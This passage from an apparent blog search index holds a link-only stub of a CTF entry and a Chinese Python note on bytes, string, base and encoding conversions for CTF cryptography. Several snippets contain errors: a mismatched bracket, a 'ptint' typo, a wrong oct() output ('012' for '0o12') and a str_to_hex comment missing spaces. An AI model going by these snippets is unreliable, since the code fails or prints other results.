href="https://blog.csdn.net/weixin_44866139/article/details/105857487?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-3&spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_44866139/article/details/105857487?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-3&amp;spm=1001.2101.3001.4242</a></p>]]></content>
    
    
    <categories>
      
      <category>buu刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUU</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习笔记1</title>
    <link href="/2021/04/17/2021-4-17-python%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/04/17/2021-4-17-python%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="python3中关于字节，字符串，进制，编码之间的总结区分"><a href="#python3中关于字节，字符串，进制，编码之间的总结区分" class="headerlink" title="python3中关于字节，字符串，进制，编码之间的总结区分"></a>python3中关于字节，字符串，进制，编码之间的总结区分</h1><p>最近学习ctf中的密码学会经常用到python但是对python中的进制转换，什么时候要用字节形式，什么时候要用到字符串形式以及进制和各种编码混在一起，这些分不太清楚做题时很浪费时间，所以来总结区分一下…</p><h3 id="首先对于字节和字符串，两者形式上的区别在于字节形式上会有一个b，类似于下面"><a href="#首先对于字节和字符串，两者形式上的区别在于字节形式上会有一个b，类似于下面" class="headerlink" title="首先对于字节和字符串，两者形式上的区别在于字节形式上会有一个b，类似于下面"></a>首先对于字节和字符串，两者形式上的区别在于字节形式上会有一个b，类似于下面</h3><p><img src="https://img-blog.csdnimg.cn/20210303210727212.png" alt="在这里插入图片描述"><br>两者也可以进行转换，如下图</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;hello world!&quot;</span><br>byte = <span class="hljs-built_in">str</span>.encode()   <span class="hljs-comment">#字符串转换为字节形式 &gt;&gt;b&quot;hello world!&quot;</span><br><span class="hljs-built_in">str</span> = byte.decode() <span class="hljs-comment">#字节形式转换为字符串</span><br><br></code></pre></div></td></tr></table></figure><h3 id="关于进制之间。"><a href="#关于进制之间。" class="headerlink" title="关于进制之间。"></a>关于进制之间。</h3><p>对于最基础的进制之间的转换，最常用的应当是python的几个内置函数，例如int()  ,   hex()   ,   bin()   ，oct()，代码如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">int</span>(x,base)     <span class="hljs-comment">#第一个参数为所给数字或者字符串，第二个参数为进制数</span><br><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>,<span class="hljs-number">16</span>)   <span class="hljs-comment">#将所给字符串按照十六进制形式转化为十进制  结果为10</span><br><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0b100&#x27;</span>,<span class="hljs-number">2</span>)  <span class="hljs-comment">#按二进制转换为十进制  ，结果为4</span><br><span class="hljs-built_in">bin</span>(<span class="hljs-number">10</span>)         <span class="hljs-comment">#&gt;&gt;&#x27;0b1010&#x27;</span><br><span class="hljs-built_in">hex</span>(<span class="hljs-number">255</span>)        <span class="hljs-comment">#&gt;&gt;&#x27;0xff&#x27;</span><br><span class="hljs-built_in">oct</span>(<span class="hljs-number">10</span>)  <span class="hljs-comment">#&gt;&gt;将十进制转换为八进制   结果为 &#x27;012&#x27;</span><br></code></pre></div></td></tr></table></figure><h3 id="关于进制与字符串之间的转换"><a href="#关于进制与字符串之间的转换" class="headerlink" title="关于进制与字符串之间的转换"></a>关于进制与字符串之间的转换</h3><p>最常用的还是字符串十六进制的转换，代码如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s]<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;hello&#x27;</span><br>ptint(str_to_hex(<span class="hljs-built_in">str</span>))         <span class="hljs-comment">#&gt;&gt;[&#x27;0x68&#x27;, &#x27;0x65&#x27;, &#x27;0x6c&#x27;, &#x27;0x6c&#x27;, &#x27;0x6f&#x27;]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.encode().<span class="hljs-built_in">hex</span>())      <span class="hljs-comment">#&gt;&gt;输出为&#x27;68656c6c6f&#x27;</span><br>hexstr = <span class="hljs-string">&#x27;68656c6c6f&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(hexstr))   <span class="hljs-comment">#输出为b&#x27;hello&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hex_to_str</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s]])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_bin</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27; &#x27;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(c)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])<br><span class="hljs-built_in">print</span>(str_to_bin(<span class="hljs-built_in">str</span>))     <span class="hljs-comment">#&gt;&gt;&#x27;0b11010000b11001010b11011000b11011000b1101111&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin_to_str</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-built_in">int</span>(b, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s.split(<span class="hljs-string">&#x27; &#x27;</span>)]])<br></code></pre></div></td></tr></table></figure><h3 id="关于字符串和编码之间"><a href="#关于字符串和编码之间" class="headerlink" title="关于字符串和编码之间"></a>关于字符串和编码之间</h3><p>最常用有关于ASCII转码的函数ord()chr()</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)   <span class="hljs-comment">#输出为97   转ASCII码</span><br><span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)    <span class="hljs-comment">#输出为&#x27;a&#x27;  ASCII转字符</span><br><span class="hljs-comment">#还可以用Crypto库</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-number">97</span>))    <span class="hljs-comment">#输出为字节型  b&#x27;a&#x27;  bytes_to_long同理</span><br>  <br></code></pre></div></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在python3之后字节与字符串以及各种编码之间已经划分的非常明确，如果对这些转换不是很明确在学习中会很浪费时间，所以再次解决这些困惑还是很有帮助的。</p><p><a href="https://blog.csdn.net/mxj588love/article/details/80692964?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161477764216780262566198%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161477764216780262566198&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-80692964.pc_search_result_hbase_insert&utm_term=python%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">参考文章1</a></p>]]></content>
    
    
    <categories>
      
      <category>python学习记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
